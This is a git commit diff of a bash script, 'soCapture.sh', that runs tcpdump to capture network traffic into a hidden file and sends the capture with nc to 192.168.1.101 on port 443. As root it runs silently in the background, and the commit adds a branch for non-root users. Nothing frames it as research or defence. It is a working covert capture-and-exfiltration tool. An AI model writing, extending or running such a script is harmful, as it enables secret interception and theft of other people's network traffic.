8e102f89337b99ddf3dcff228d8bd44e94b35691
Sobanggg <abolfazleshghi1385@gmail.com>
2024-06-02 03:17:06 -0400

    cheking user

--- soCapture.sh
+++ soCapture.sh
@@ -1,5 +1,11 @@
 #!/bin/bash  
-{
-tcpdump -w /home/..1
-nc -w 3 192.168.1.101 443 < /home/..1
-} > /dev/null 2>&1 &
+user=`whoami`
+if [[ $user == "root"  ]]; then
+	{
+	tcpdump -w /home/..1
+	nc -w 3 192.168.1.101 443 < /home/..1
+	} > /dev/null 2>&1 &
+else
+	tcpdump -w /home/$user/..1
+	nc -w 3 192.168.1.101 443 < /home/$user/..1
+fi
